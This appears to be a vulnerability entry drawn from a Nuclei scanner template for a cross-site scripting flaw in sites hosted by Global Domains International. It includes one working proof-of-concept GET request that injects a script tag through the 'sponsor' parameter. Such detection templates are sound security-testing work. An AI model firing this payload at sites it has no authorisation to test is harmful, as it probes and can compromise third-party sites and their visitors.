# Vulnerability: Global Domains International - Cross-Site Scripting
**Classification:** CWE-80
**Source:** Nuclei Template (`global-domains-xss.yaml`)

## Description
Sites hosted by Global Domains International, Inc. have cross-site scripting and directory traversal vulnerabilities.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.dhtml?sponsor=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

